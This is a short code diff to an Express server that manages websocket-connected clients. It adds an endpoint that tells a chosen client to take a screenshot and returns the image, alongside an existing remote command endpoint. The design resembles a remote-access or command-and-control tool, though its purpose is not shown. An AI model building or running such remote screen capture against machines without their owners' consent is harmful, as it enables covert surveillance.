@@ -22,6 +22,21 @@ app.post('/command', (req, res) => {
 	}
 })
 
+app.post('/screenshot', async (req, res) => {
+	const { clientId } = req.body
+	if (clients[clientId]) {
+		clients[clientId].send(JSON.stringify({type: 'screenshot'}))
+		
+		console.log('sent screenshot')
+		clients[clientId].once('message', (message) => {
+			const buffer = JSON.parse(message).buffer
+			res.send(buffer)
+		})
+	} else {
+		res.status(404).send('Client not found')
+	}
+})
+
 app.get('/clients', async (req, res) => {
 	const promises = Object.keys(clients).map(
 		(id) =>
@@ -44,7 +59,6 @@ app.get('/clients', async (req, res) => {
 
 	try {
 		const data = await Promise.all(promises)
-		console.log(data)
 		res.send(data)
 	} catch (error) {
 		res.status(500).send(error.message)
